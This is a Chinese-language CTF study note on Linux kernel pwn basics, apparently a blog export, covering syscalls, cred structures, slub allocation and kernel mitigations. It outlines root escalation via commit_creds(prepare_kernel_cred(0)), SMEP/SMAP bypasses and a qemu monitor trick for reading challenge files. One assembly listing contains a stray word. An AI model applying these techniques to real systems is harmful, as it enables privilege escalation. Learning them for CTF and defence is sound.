只支持 x86_64 架构。\n\n### SMEP/SMAP\n\nSMEP即**管理模式执行保护**（Supervisor Mode Execution Protection）。当处理器处于 `ring0` 模式（内核态）时，**执行用户空间的代码**会触发页错误。（在 arm 中该保护称为 `PXN`）\n\n SMAP即**管理模式访问保护**（Superivisor Mode Access Protection），类似于 smep，当处理器处于 `ring0` 模式（内核态）时，**访问用户空间的数据**会触发错误。\n\n这两种保护通常是同时开启的，用以阻止**内核空间直接访问/执行用户空间的数据**，完全地将内核空间与用户空间相分隔开，用以**防范ret2usr**（return-to-user，将内核空间的指令指针重定向至用户空间上构造好的提权代码）攻击。\n\n绕过方法：\n\n- 利用内核线性映射区对物理地址空间的完整映射，找到用户空间对应页框的内核空间地址，利用该内核地址完成对用户空间的访问（即**一个内核空间地址与一个用户空间地址映射到了同一个页框上**），这种攻击手法称为`ret2dir`\n- Intel下系统根据CR4控制寄存器的第20位标识是否开启SMEP保护（1为开启，0为关闭），若是能够通过kernel ROP**改变CR4寄存器的值**便能够关闭SMEP保护，完成SMEP-bypass，接下来就能够重新进行 ret2usr，**但对于开启了 KPTI 的内核而言，内核页表的用户地址空间无执行权限，这使得 ret2usr 彻底成为过去式**。\n\n### STACK PROTECTOR\n\n类似于用户态程序的 canary，通常又被称作是 stack cookie，用以检测**是否发生内核堆栈溢出**，若是发生内核堆栈溢出则会产生 kernel panic\n\n内核中的 canary 的值通常**取自`GS`段寄存器某个固定偏移处的值**，可以尝试劫持这个值。\n\n### KPTI\n\nKPTI即**内核页表隔离**（Kernel page-table isolation），内核空间与用户空间分别使用**两组不同的页表集**，这对于内核的内存管理产生了根本性的变化\n\n### Hardened Usercopy\n\n`hardened usercopy`在用户空间与内核空间之间拷贝数据时进行越界检查，**主要检查拷贝过程中对内核空间中数据的读写是否会越界（包括读写两方面）**。常用于`copy_to_user()`和`copy_form_user()`。\n\n绕过方式：这种保护不适用于内核空间之间的数据拷贝。\n\n###  Hardened freelist\n\n在开启这种保护之前，`slub` 中的 `free object` 的 `next` 指针直接存放着 `next free object` 的地址，攻击者可以通过读取 `freelist` 泄露出内核线性映射区的地址。\n\n在开启了该保护之后 `free object` 的 `next` 指针存放的是由以下三个值进行**异或**操作后的值：\n\n- 当前 `free object` 的地址\n- 下一个 `free object` 的地址\n- 由 `kmem_cache` 指定的一个 random 值\n\n这使得攻击者必须要获取第一和第三个值才能修改`free list`\n\n###  Random freelist\n\n这种保护主要发生在 slub allocator 向 buddy system 申请到页框之后的处理过程中，对于未开启这种保护的一张完整的 slub，其上的 object 的连接顺序是**线性连续**的，但在开启了这种保护之后其上的 object 之间的连接顺序是**随机**的，这让攻击者**无法直接预测**下一个分配的 object 的地址\n\n需要注意的是这种保护发生在**slub allocator 刚从 buddy system 拿到新 slub 的时候，运行时 freelist 的构成仍遵循 LIFO**\n\n###  CONFIG_INIT_ON_ALLOC_DEFAULT_ON\n\n当编译内核时开启了这个选项时，在内核进行“堆内存”分配时（包括 buddy system 和 slab allocator），**会将被分配的内存上的内容进行清零**，从而防止了利用未初始化内存进行数据泄露的情况\n\n## kernel pwn相关文件\n\nkernel pwn的题目一般会给以下三个文件：\n\n1. boot.sh: 一个用于启动 kernel 的 shell 的脚本，多用 qemu，保护措施与 qemu 不同的启动参数有关\n2. bzImage: kernel binary\n3. rootfs.cpio: 文件系统映像\n\nqemu部分参数说明如下：\n\n- `-m`：虚拟机内存大小\n- `-kernel`：内存镜像路径(bzimage)\n- `-initrd`：磁盘镜像路径(rootfs.cpio)\n- `-append`：附加参数选项\n    - `nokalsr`：关闭内核地址随机化，方便我们进行调试\n    - `rdinit`：指定初始启动进程，`/sbin/init`进程会默认以 `/etc/init.d/rcS` 作为启动脚本\n    - `loglevel=3 `& `quiet`：不输出log\n    - `console=ttyS0`：指定终端为`/dev/ttyS0`，这样一启动就能进入终端界面\n- `-monitor`：将监视器重定向到主机设备`/dev/null`，这里重定向至null主要是防止CTF中被人给偷了qemu拿flag，遇到没有这一行的可以直接通过`ctrl a + c`进入`qemu`的`monitor`模式，之后通过`migrate \"exec: cat rootfs.cpio 1>&2\"`查看`rootfs.cpio`文件，在其中找`flag`。\n\n- `-cpu`：设置CPU安全选项（如smep保护）\n- `-s`：相当于`-gdb tcp::1234`的简写（也可以直接这么写），后续我们可以通过gdb连接本地端口进行调试\n\n","source":"_posts/Kernel_Basic_Knowledge.md","raw":"---\ntitle: Kernel Basic Knowledge\ndate: 2023-01-02 00:01:40\ncategories: \n- pwn\ntags: \n- pwn\n- kernel\n---\n\n开始学习kernel pwn，在用户态pwn中，我们需要利用用户态程序的漏洞，劫持该程序的执行流，从该程序中起一个`shell`，或者走`orw`获得`flag`。kernel pwn中类似，我们需要利用内核的漏洞，劫持程序流使其能够提权到`root`或者使其能泄露敏感信息`flag`。\n\n**kernel pwn和用户态pwn在本质上并没有区别**，利用思路都是相似的，只是细节上会有所差别。一般来说，kernel pwn也不会让我们找内核中的漏洞，而是给出一个有问题的`LKM`让我们分析。\n\n<!--more-->\n\n## Kernel\n\nkernel也就是内核，是操作系统的核心部分，用来管理软件发出的数据 I/O 要求，将这些要求转义为指令，交给 CPU 和计算机中的其他组件处理。kernel处在应用程序和硬件之间，向上对应用程序提供硬件的使用接口，向下按照应用程序的要求与硬件进行交互。\n\n![image-20230115125518678](./Kernel_Basic_Knowledge/image-20230115125518678.png)\n\n但无论是应用程序还是操作系统，他们始终都是**程序**，他们**都是在物理地址上运行的代码和数据**，他们之间的区别主要在于**权限**。操作系统能够使用**所有的指令**，这使**内核态代码能完全使用所有硬件**，而应用程序只能使用**一部分指令**，这导致**用户态代码只能部分使用硬件**。\n\n需要注意的是，**kernel 的 crash 通常会引起重启**。\n\n### 内核架构\n\n通常来说我们可以把内核架构分为两种：`宏内核`和`微内核`，现在还有一种内核是混合了宏内核与微内核的特性，称为 `混合内核` ，宏内核和微内核的区别如下：\n\n- 宏内核：此架构的特性是**整个内核程序是一个单一二进制可执行文件**，**几乎所有功能都被集成进内核**。在内核态以监管者模式（Supervisor Mode）来运行在一个单独的地址空间**，所有的内核服务都在一个地址空间运行，相互之间直接调用函数**，简单高效。宏内核会定义出一个高端的虚拟接口，由该接口来涵盖描述整个电脑硬件，这些描述会集合成一组硬件描述用词，有时还会附加一些系统调用，如此可以用一个或多个模块来实现各种操作系统服务。\n- 微内核：内核中只有最基本的调度、内存管理。驱动、文件系统等都是用户态的守护进程去实现的，**微内核中功能被划分成独立的过程**，**过程间通过IPC进行通信**。模块化程度高，一个服务失效不会影响另外一个服务。\n\n**Linux Kernel采用的是宏内核**。\n\n## **hierarchical protection domains**（分级保护域）\n\nintel CPU将权限划分为`Ring0、Ring1、Ring2、Ring3`四个等级，就像这四个等级的名字一样，四个等级构成四个环。\n\n越里面的环的权限越高，使用硬件的能力越强，其中`Ring0`表示最高权限，`Ring3`表示最低权限。通过这种方式对计算机的资源进行分级，实现权限的管理。\n\n![image-20230115130938230](./Kernel_Basic_Knowledge/image-20230115130938230.png)\n\n`Ring0`拥有最高特权，并且可以和最多的硬件直接交互（比如CPU，内存），因此**操作系统内核代码通常运行在 `Ring0` 下，即 CPU 在执行操作系统内核代码时处在`Ring0` 下**。\n\n应用程序代码通常处在`Ring3`，拥有的权限最低，即 **CPU 在执行用户进程代码时处在 ring3 下**。\n\n那么什么是用户态，什么是内核态呢？\n\n- 用户态：CPU 运行在 `Ring3` + 用户进程运行环境上下文\n- 内核态：CPU 运行在 `Ring0` + 内核代码运行环境上下文\n\n## 状态切换\n\n当发生**系统调用(syscall,int 0x80)，产生异常，外设产生中断**等事件时，会发生**用户态到内核态**的切换，具体的过程为：\n\n1. 通过 `swapgs` 切换`GS`段寄存器，将 `GS` 寄存器值**和一个特定位置的值进行交换**，目的是保存`GS`值，同时将该位置的值**作为内核执行时的`GS`值**使用。\n2. 将当前栈顶（用户空间栈顶）记录在 **CPU 独占变量区域**里，将 CPU 独占区域里记录的**内核栈顶**放入 `rsp/esp`。\n3. 通过 push 保存各寄存器值:\n\n```c\n ENTRY(entry_SYSCALL_64)\n /* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */\n SWAPGS_UNSAFE_STACK\n\n /* 保存栈值，并设置内核栈 */\n movq %rsp, PER_CPU_VAR(rsp_scratch)\n movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp\n\n\n/* 通过push保存寄存器值，形成一个pt_regs结构 */\n/* Construct struct pt_regs on stack */\npushq  $__USER_DS      /* pt_regs->ss */\npushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs->sp */\npushq  %r11             /* pt_regs->flags */\npushq  $__USER_CS      /* pt_regs->cs */\npushq  %rcx             /* pt_regs->ip */\npushq  %rax             /* pt_regs->orig_ax */\npushq  %rdi             /* pt_regs->di */\npushq  %rsi             /* pt_regs->si */\npushq  %rdx             /* pt_regs->dx */\npushq  %rcx tuichu    /* pt_regs->cx */\npushq  $-ENOSYS        /* pt_regs->ax */\npushq  %r8              /* pt_regs->r8 */\npushq  %r9              /* pt_regs->r9 */\npushq  %r10             /* pt_regs->r10 */\npushq  %r11             /* pt_regs->r11 */\nsub $(6*8), %rsp      /* pt_regs->bp, bx, r12-15 not saved */\n```\n\n4. 通过汇编指令判断是否为 `x32_abi`（表示是否为32位系统）。\n5. 通过**系统调用号**，跳到全局变量 `sys_call_table` 相应位置继续执行系统调用。\n\n当在内核态中的工作执行完时，会从**内核态返回用户态**，过程如下：\n\n1. 通过 `swapgs` 恢复`GS`值\n2. 通过 `sysretq` 或者 `iretq` 恢复到用户控件继续执行。如果使用 `iretq` 还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等）\n\n## 系统调用\n\n系统调用提供用户程序与操作系统间的接口，部分库函数（如 scanf，puts 等 IO 相关的函数实际上是对系统调用的封装（read 和 write））。当用户空间的程序利用现有权限无法满足需求时，就会进行系统调用向操作系统内核请求需要更高权限的服务。在这个过程中，用户进程会**暂时陷入内核态，待内核工作完成后再返回用户态**。\n\n64位和32位的系统调用号分别存放在 `/usr/include/x86_64-linux-gnu/asm/unistd_64.h` 和 `/usr/include/x86_64-linux-gnu/asm/unistd_32.h` 。\n\n根据系统位数不同，Linux 下系统调用的方式也不同：\n\n- 32位：执行 `int 0x80 `汇编指令（80号中断）\n- 64位：执行 `syscall` 汇编指令 / 执行 `sysenter` 汇编指令（only intel）\n\n用户态进入到内核态的流程如下：\n\n通过`eax/rax`寄存器存放**系统调用号**，并通过寄存器存放该系统调用的参数：\n\n- 32 位：`ebx、ecx、edx、esi、edi、ebp`作为第一个参数、第二个参数…进行参数传递\n- 64 位：`rdi、rsi、rdx、rcx、r8、r9`作为第一个参数、第二个参数…进行参数传递\n\n同样地，内核执行完系统调用后退出系统调用也有对应的两种方式：\n\n- 执行`iret`汇编指令\n- 执行 `sysret` 汇编指令 / 执行`sysexit`汇编指令（only Intel）\n\n## 进程权限管理\n\nkernel调度所有计算机资源，并为应用程序提供他们的抽象，相应的，应用程序的权限也由kernel来管理，kernel决定一个应用程序是否有权限使用某一抽象。\n\n在内核中使用结构体 `task_struct` 表示一个进程，该结构体定义于内核源码`include/linux/sched.h`中，其中的内容大致如下：\n\n![img](./Kernel_Basic_Knowledge/2W8xIfwqm9Y7Fru.png)\n\n### 结构体cred\n\n在结构体`task struct`中就包含有权限的信息，**Process credentials** 就是 kernel 用以判断一个进程权限的凭证，在 kernel 中使用 `cred` 结构体进行标识，对于一个进程而言应当有三个 cred：\n\n- **ptracer_cred：**使用`ptrace`系统调用跟踪该进程的上级进程的cred（gdb调试便是使用了这个系统调用，常见的反调试机制的原理便是提前占用了这个位置）\n- **real_cred：**即**客体凭证**（**objective cred**），通常是一个进程最初启动时所具有的权限\n- **cred：**即**主体凭证**（**subjective cred**），该进程的有效cred，kernel以此作为进程权限的凭证\n\n一般情况下，主体凭证与客体凭证的值是相同的\n\n```c\n/* Process credentials: */\n\n/* Tracer's credentials at attach: */\nconst struct cred __rcu        *ptracer_cred; //gdb调试使用该cred\n\n/* Objective and real subjective task credentials (COW): */\nconst struct cred __rcu        *real_cred; //进程最初的权限\n\n/* Effective (overridable) subjective task credentials (COW): */\nconst struct cred __rcu        *cred; //进程当前的权限\n```\n\n结构体`cred`定义于内核源码`include/linux/cred.h`中，用于表示权限凭证：\n\n```c\nstruct cred {\n    atomic_t    usage;\n#ifdef CONFIG_DEBUG_CREDENTIALS\n    atomic_t    subscribers;    /* number of processes subscribed */\n    void        *put_addr;\n    unsigned    magic; //可用于寻找cred结构体\n#define CRED_MAGIC    0x43736564\n#define CRED_MAGIC_DEAD    0x44656144\n#endif\n    //各种ID\n    kuid_t        uid;        /* real UID of the task */ \n    kgid_t        gid;        /* real GID of the task */\n    kuid_t        suid;        /* saved UID of the task */\n    kgid_t        sgid;        /* saved GID of the task */\n    kuid_t        euid;        /* effective UID of the task */\n    kgid_t        egid;        /* effective GID of the task */\n    kuid_t        fsuid;        /* UID for VFS ops */\n    kgid_t        fsgid;        /* GID for VFS ops */\n    \n    unsigned    securebits;    /* SUID-less security management */\n    kernel_cap_t    cap_inheritable; /* caps our children can inherit */\n    kernel_cap_t    cap_permitted;    /* caps we're permitted */\n    kernel_cap_t    cap_effective;    /* caps we can actually use */\n    kernel_cap_t    cap_bset;    /* capability bounding set */\n    kernel_cap_t    cap_ambient;    /* Ambient capability set */\n#ifdef CONFIG_KEYS\n    unsigned char    jit_keyring;    /* default keyring to attach requested\n                     * keys to */\n    struct key    *session_keyring; /* keyring inherited over fork */\n    struct key    *process_keyring; /* keyring private to this process */\n    struct key    *thread_keyring; /* keyring private to this thread */\n    struct key    *request_key_auth; /* assumed request_key authority */\n#endif\n#ifdef CONFIG_SECURITY\n    void        *security;    /* subjective LSM security */\n#endif\n    struct user_struct *user;    /* real user ID subscription */\n    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */\n    struct group_info *group_info;    /* supplementary groups for euid/fsgid */\n    /* RCU deletion */\n    union {\n        int non_rcu;            /* Can we skip RCU deletion? */\n        struct rcu_head    rcu;        /* RCU deletion hook */\n    };\n} __randomize_layout;\n```\n\n`cred`结构体中记录了**一个进程四种不同种类的UID（用户ID）和GID（组ID）**：\n\n- **真实ID**（real ID）：标识一个进程**启动时的ID**\n- **保存ID**（saved ID）：标识一个进程**最初的有效ID**\n- **有效ID**（effective ID）：标识一个进程**正在运行时所属的ID**，一个进程在运行途中是可以改变自己所属用户和组的，因而权限机制也是**通过有效ID进行认证**的，内核通过有效ID来进行特权判断；为了防止用户一直使用高权限，**当任务完成之后，有效ID会与保存ID进行交换**，恢复进程的有效权限\n- **文件系统ID**（ID for VFS ops）：标识一个进程**创建文件时进行标识的ID**\n\n通常情况下这几个ID都是相同的。\n\n### 提权\n\n一个进程的权限是由位于内核空间的`cred`结构体进行管理的，因此只要改变一个进程的`cred`结构体，就能改变其执行权限，在内核空间有如下两个函数，都位于`kernel/cred.c`中，可以用于改变`cred`结构体：\n\n- `struct cred* prepare_kernel_cred(struct task_struct* daemon)`：该函数用以拷贝一个进程的cred结构体，并返回一个新的cred结构体，需要注意的是`daemon`参数应为**有效的进程描述符地址或NULL**\n- `int commit_creds(struct cred *new)`：该函数用以将一个新的`cred`结构体应用到进程\n\n在`prepare_kernel_cred()`函数中，若传入的参数为NULL，则会缺省使用`init`进程的`cred`作为模板进行拷贝，**即可以直接获得一个标识着root权限的cred结构体**\n\n那么我们不难想到，只要我们能够**在内核空间执行`commit_creds(prepare_kernel_cred(NULL))`**，那么就能够将当前进程的权限提升到`root`\n\n## 文件\n\nLinux系统的设计中秉承着**万物皆文件**的思想，因此**所有计算机资源都被抽象为文件**，无论是硬件设备、目录、普通文件、管道，甚至进程、磁盘都被抽象成文件。基于这种设计，**所有计算机资源都可以通过访问文件的形式进行操作，所有读操作都可以使用`read`完成，所有写操作都可以使用`write`完成**，所有操作最后都可以以读写的方式实现。\n\n### 进程文件系统\n\n我们知道Linux系统中的进程也被抽象成了文件，那就代表它的数据以文件的形式存放，并且我们可以通过访问文件的形式对其进行读写。\n\n进程文件系统（process file system， 简写为procfs）用以描述一个进程，其中包括该进程所打开的文件描述符、堆栈内存布局、环境变量等等。它本身是一个伪文件系统，通常被挂载到`/proc`目录下，并不真正占用储存空间，而是占用一定的**内存**。当一个进程被建立起来时，其进程文件系统便会被**挂载到`/proc/[PID]`**下，我们可以在该目录下查看其相关信息。\n\n### 文件的访问\n\n进程通过**文件描述符**（**file descriptor**）来完成对文件的访问，文件描述符是一个非负整数，本质上是对文件的索引值，进程所有执行 I/O 操作的系统调用都会通过文件描述符来找到对应文件。\n\n每个进程都**独立有着一个文件描述符表**，存放着该进程所打开的文件索引，每当进程**成功**打开一个现有文件/创建一个新文件时（通过系统调用open进行操作），**内核会向进程返回一个文件描述符**。在kernel中有着一个文件表，由所有的进程**共享**。\n\n详细可以回看`IO_FILE`部分。\n\n### iotcl\n\n操作系统向应用程序提供了系统调用，使应用程序可以**通过内核访问标准外部设备**，因为大多数硬件设备只能够在内核空间内直接寻址。\n\n但是当访问**非标准**硬件设备时，使用系统调用显得不合适， 因为部分设备可能没有被内核考虑到，这样应用程序就无法使用该设备了，这时候就需要用户模式直接访问设备。\n\n为了解决这个问题，内核被设计成**可扩展**的，可以加入一个称为**设备驱动**的模块，**驱动的代码允许在内核空间运行而且可以对设备直接寻址**。并且预留了一个**系统调用`iotcl`用于用户空间和设备驱动的通信**。\n\n对设备驱动的请求是一个**以设备和请求号码为参数**的`ioctl`调用，如此内核就允许用户空间访问设备驱动进而访问设备而不需要了解具体的设备细节，同时也不需要一大堆针对不同设备的系统调用。\n\n```c\nint ioctl(int fd, unsigned long request, ...)\n```\n\n- **fd：设备的文件描述符**\n- **request：请求码**\n- **其他参数**\n\n## Loadable Kernel Modules(LKMs)\n\nLinux Kernel采用宏内核架构，一切的系统服务都需要由内核来提供，虽然效率较高，但是**缺乏可扩展性与可维护性**。同时内核需要装载很多可能用到的服务，但这些服务最终可能未必会用到，还会**占据大量内存空间**，如果要加入的新服务往往意味着要**重新编译整个内核**。\n\n**可加载内核模块（Loadable Kernel Modules，即LKMs）**的设计就是为了解决上述问题。在内核空间运行的LKMs可以为应用程序提供**新的系统调用或服务**，同时LKMs可以像积木一样从内核中被**装载/卸载**，大大提高了kernel的可拓展性与可维护性\n\n可加载内核模块 (或直接称为内核模块) 就像运行在内核空间的可执行程序，包括:\n\n- 驱动程序（Device drivers）\n    - 设备驱动\n    - 文件系统驱动\n    - ...\n- 内核扩展模块 (modules)\n\nLKMs与用户态可执行文件一样都**采用ELF格式**，但是**LKMs运行在内核空间，且无法脱离内核运行**\n\n通常与LKM相关的命令有以下三个：\n\n- `lsmod`：列出现有的LKMs\n- `insmod`：装载新的LKM（需要root）\n- `rmmod`：从内核中移除LKM（需要root）\n- `modprobe`: 添加或删除模块，modprobe 在加载模块时会查找依赖关系\n\n> 大多数CTF比赛中，kernel pwn的漏洞出现在 LKM 中。\n\n## 内核内存管理\n\nLinux kernel 将内存分为 `页→区→节点` 三级结构，主要有两个内存管理器—— `buddy system` 与 `slab allocator`。内存结构**自顶向下**依次为：\n\n- 节点(node)\n- 区(zone)\n- 页(page)\n\n### 内核内存结构\n\n页：Linux kernel 中使用 `page` 结构体来表示一个物理页框，**每个物理页框都有着一个对应的 page 结构体**。\n\n![image.png](./Kernel_Basic_Knowledge/MjWZmba9SLH1xIO.png)\n\n\n\n区：在 Linux 下将一个节点内**不同用途**的内存区域划分为不同的 `区（zone）`，对应结构体 `struct zone`。\n\n![偷的图.png](./Kernel_Basic_Knowledge/sOwdI5YMNUjLSib.png)\n\n节点：zone 再向上一层便是**节点**——Linux 将**内存控制器（memory controller）**作为节点划分的依据。\n\n### 内存模型\n\nLinux 提供了三种内存模型，定义于 `include/asm-generic/memory_model.h` 中。\n\n![image.png](./Kernel_Basic_Knowledge/wLzFuCB5n1DAIY7.png)\n\n内存模型在编译期就会被确定下来，目前常用的是 `Sparse Memory` 模型，即离散内存模型。\n\n#### Flat Memory\n\n平滑内存模型。物理内存地址连续，有一个**全局变量** `mem_map` ，通过一个大的 `struct page` 数组直接对应现有的物理内存。\n\n#### Discontiguous Memory\n\n非连续性内存模型。主要针对内存中存在空洞的情况。\n\n对于**每一段连续的物理内存**，都有一个 `pglist_data` 结构体进行对应，其成员 `node_mem_map` 为一个 `struct page` 指针，指向一个 page 结构体数组，由该结构体对应到该段连续物理内存。\n\n有一个**全局变量** `node_data` 为一个 `pglist_data` 指针数组，其中存放着指向每一个 `pglist_data` 的指针，该数组的大小为 `MAX_NUMNODES`。\n\n#### Sparse Memory\n\n离散内存模型。在一个 `mem_section` 结构体中存在一个 `section_mem_map` 成员指向一个 `struct page` 数组对应一段连续的物理内存，即**将内存按照 `section` 为单位**进行分段。\n\n存在一个全局指针数组 `mem_section` （与结构体同名）存放所有的 `mem_section` 指针，指向**理论上支持的内存空间**，每个 `section` **对应的物理内存不一定存在**，若不存在则此时该 section 的指针为 NULL。\n\n这种模型**支持内存的热拔插**。\n\n### buddy system\n\n`buddy system` 是 Linux kernel 中的一个较为底层的内存管理系统，**以内存页为粒度管理所有的物理内存**，其存在于 **区** 这一级别，对当前区所对应拥有的所有物理页框进行管理\n\n在每个 zone 结构体中都有一个 `free_area` 结构体数组，用以存储 buddy system **按照 order 管理的页面**\n\n```c\nstruct zone {\n    //...\n    struct free_area\tfree_area[MAX_ORDER];\n    //...\n```\n\n`MAX_ORDER`为一个常量，其值为`11`。\n\n在 buddy system 中**按照空闲页面的连续大小**进行**分阶**管理，这里的 order 的实际含义为**连续的空闲页面的大小**，不过单位不是页面数，而是`阶`，即对于每个下标而言，其中所存储的页面大小为：$2^{order}$。\n\n`free_area`中的页面通过自身的相应字段形成**双向链表**结构：\n\n![偷的图.png](./Kernel_Basic_Knowledge/sOwdI5YMNUjLSib-1678172668801-7.png)\n\n- 分配：\n    - 首先会将请求的内存大小向 2 的幂次方张内存页大小**对齐**，之后从**对应的下标**取出连续内存页\n    - 若对应下标链表为**空**，则会从**下一个 order** 中取出内存页，**一分为二**，装载到当前下标对应链表中，之后再返还给上层调用，若下一个 order 也为空则会继续向**更高**的 order 进行该请求过程\n- 释放：\n    - 将对应的连续内存页释放到对应的链表上\n    - 检索**是否有可以合并**的内存页，若有，则进行合成，放入**更高** order 的链表中\n\n但是我们很容易产生**不容易合并**的内存碎片，因此 Linux kernel 还会进行 **内存迁移** 以减少内存碎片，主要由一个持续运行的内核线程完成。\n\n### slab allocator\n\nslab allocator 则是**更为细粒度的内存管理器**，其通过向 buddy system 请求**单张或多张连续内存页**后再分割成**同等大小**的**对象**（object）返还给上层调用者来实现更为细粒度的内存管理\n\nslab allocator 一共有三种版本：\n\n- slab（最初的版本，机制比较复杂，效率不高）\n- slob（用于嵌入式等场景的极为简化版本）\n- slub（优化后的版本，现在的通用版本）\n\n#### 基本结构\n\nslub allocator的基本结构如下：\n\n![image.png](./Kernel_Basic_Knowledge/ivPnbsjHyI94m5z.png)\n\nslub allocator每次向buddy system请求得到的单**张/多张的内存页称为一个`slub`**，这个`slub`会被分为多个**同样大小**的对象(object)，每个object作为一个被分配的实体。在 `slub` 的**第一张内存页**对应的 page 结构体上的 `freelist` 成员指向该张内存页上的**第一个空闲对象**，一个 `slub` 上的**所有空闲对象**组成一个以 `NULL` 结尾的**单向**链表。\n\n> object类似于堆中的chunk，不过由于page结构体与物理地址之间有线性对应关系，可以直接通过object地址找到对应的page结构体，因此不需要header\n\n`kmem_cache`是allocator一个**分配组件**，用于**分配特定大小（特定用途）**的对象，所有的`kmem_cache`构成一个**双向**链表。存在两个结构体数组`kmalloc_caches`和`kmalloc_dma_caches`对`kmem_cache`进行管理。\n\n一个`kmem_cache`主要由`kmem_cache_cpu`和`kmem_cache_node`组成。\n\n- `kmem_cache_cpu`：这是一个**percpu 变量**（即每个核心上都独立保留有一个副本，原理是以` gs` 寄存器作为 `percpu` 段的基址进行寻址），用以表示**当前核心正在使用的 `slub`**，因此当前 CPU 在从 kmem_cache_cpu 上取 object 时**不需要加锁**，从而极大地提高了性能\n- kmem_cache_node：可以理解为当前kmem_cache的 slub 集散中心，其中存放着**两个 slub 链表**：\n    - partial：该 slub 上**存在**着一定数量的**空闲** object，但并非全部空闲\n    - full：该 slub 上的**所有** object 都被**分配**出去了\n\n#### 分配和释放\n\n- 分配：\n    - 首先从 `kmem_cache_cpu` 上取对象，若有则直接返回\n    - 若 `kmem_cache_cpu` 上的 slub 已经无空闲对象了，对应 slub 会被加入到 `kmem_cache_node` 的 **full** 链表，并尝试从 **partial** 链表上取一个 slub 挂载到 `kmem_cache_cpu` 上，然后再取出空闲对象返回\n    - 若 `kmem_cache_node` 的 partial 链表也空了，那就**向 buddy system 请求分配新的内存页**，划分为多个 object 之后再给到 `kmem_cache_cpu`，取空闲对象返回上层调用\n- 释放：\n    - 若被释放 object 属于 `kmem_cache_cpu` 的 slub，直接使用头插法插入当前 CPU slub 的 freelist\n    - 若被释放 object 属于 `kmem_cache_node` 的 partial 链表上的 slub，直接使用头插法插入对应 slub 的 freelist\n    - 若被释放 object 属于 `kmem_cache_node` 的 full 链表上的 slub，则其会成为对应 slub 的 freelist 头节点，**且该 slub 会从 full 链表迁移到 partial 链表**\n\n#### slab alias\n\nslab alias 机制是一种对**同等/相近大小** object 的 `kmem_cache` 进行**复用**的一种机制：\n\n当一个 `kmem_cache` 在创建时，若已经存在能分配**相等/近似**大小的 object 的 `kmem_cache` ，则**不会创建新的 kmem_cache，而是为原有的 kmem_cache 起一个 alias，作为“新的” kmem_cache 返回**\n\n对于初始化时设置了 `SLAB_ACCOUNT` 这一 flag 的 `kmem_cache` 而言，则会**新建**一个新的 `kmem_cache` 而非为原有的建立 alias。\n\n如：在 Linux 4.4 之前的版本中，`cred_jar` 是 `kmalloc-192`的`alias`，在此之后的版本中，由于设置了`SLAB_ACCOUNT` 标志`cred_jar` 和 `kmalloc-192`是两个独立的 `kmem_cache`。（`cred_jar`是专门用于分配`cred`结构体的`kmem_cache`）\n\n## 内核态函数\n\n内核态的函数有些变化：\n\n- printf() -> **printk()**，但需要注意的是 printk() 不一定会把内容显示到终端上，但一定在**内核缓冲区**里，可以通过 `dmesg` 查看效果\n- memcpy() ->copy_from_user()/copy_to_user()\n    - `unsigned long copy_from_user(void *to, const void __user *from, unsigned long n)`实现了将用户空间的数据传送到内核空间\n    - `unsigned long copy_to_user (void __user * to, const void * from, unsigned long n) `实现了将内核空间的数据传送到用户空间\n- malloc() -> **kmalloc()**，内核态的内存分配函数，和 malloc() 相似，但使用的是 `slab/slub 分配器`\n- free() -> **kfree()**，同 kmalloc()\n\n用于改变权限的函数：\n\n- `struct cred* prepare_kernel_cred(struct task_struct* daemon)`：该函数用以拷贝一个进程的cred结构体，并返回一个新的cred结构体，需要注意的是`daemon`参数应为**有效的进程描述符地址或NULL**\n- `int commit_creds(struct cred *new)`：该函数用以将一个新的`cred`结构体应用到进程\n\n从函数名也可以看出，执行 `commit_creds(prepare_kernel_cred(0))` 即可获得 root 权限，0 表示 以 0 号进程作为参考准备新的 credentials。\n\n## 内核态保护机制\n\n与用户态类似，内核态也有对应的保护机制，canary, dep, PIE, RELRO 等保护与用户态原理和作用相同，除此之外，内核还有特殊的保护机制。\n\n### KASLR\n\nKASLR即`内核空间地址随机化`（kernel address space layout randomize），与用户态程序的ASLR相类似，在内核镜像映射到实际的地址空间时加上一个随机的偏移值，但是内核内部的**相对偏移**其实还是不变的\n\n### FGKASLR\n\nKASLR 虽然在一定程度上能够缓解攻击，但是若是攻击者通过一些信息泄露漏洞获取到内核中的某个地址，仍能够直接得知内核加载地址偏移从而得知整个内核地址布局，这在用户态pwn中也已经见怪不怪了。\n\n因此有研究者基于 KASLR 实现了 FGKASLR，**以函数粒度重新排布内核代码**，将每个函数单独分段，每个段的偏移随机化，这会大大提高攻击的难度。目前，FGKASLR 只支持 x86_64 架构。\n\n### SMEP/SMAP\n\nSMEP即**管理模式执行保护**（Supervisor Mode Execution Protection）。当处理器处于 `ring0` 模式（内核态）时，**执行用户空间的代码**会触发页错误。（在 arm 中该保护称为 `PXN`）\n\n SMAP即**管理模式访问保护**（Superivisor Mode Access Protection），类似于 smep，当处理器处于 `ring0` 模式（内核态）时，**访问用户空间的数据**会触发错误。\n\n这两种保护通常是同时开启的，用以阻止**内核空间直接访问/执行用户空间的数据**，完全地将内核空间与用户空间相分隔开，用以**防范ret2usr**（return-to-user，将内核空间的指令指针重定向至用户空间上构造好的提权代码）攻击。\n\n绕过方法：\n\n- 利用内核线性映射区对物理地址空间的完整映射，找到用户空间对应页框的内核空间地址，利用该内核地址完成对用户空间的访问（即**一个内核空间地址与一个用户空间地址映射到了同一个页框上**），这种攻击手法称为`ret2dir`\n- Intel下系统根据CR4控制寄存器的第20位标识是否开启SMEP保护（1为开启，0为关闭），若是能够通过kernel ROP**改变CR4寄存器的值**便能够关闭SMEP保护，完成SMEP-bypass，接下来就能够重新进行 ret2usr，**但对于开启了 KPTI 的内核而言，内核页表的用户地址空间无执行权限，这使得 ret2usr 彻底成为过去式**。\n\n### STACK PROTECTOR\n\n类似于用户态程序的 canary，通常又被称作是 stack cookie，用以检测**是否发生内核堆栈溢出**，若是发生内核堆栈溢出则会产生 kernel panic\n\n内核中的 canary 的值通常**取自`GS`段寄存器某个固定偏移处的值**，可以尝试劫持这个值。\n\n### KPTI\n\nKPTI即**内核页表隔离**（Kernel page-table isolation），内核空间与用户空间分别使用**两组不同的页表集**，这对于内核的内存管理产生了根本性的变化\n\n### Hardened Usercopy\n\n`hardened 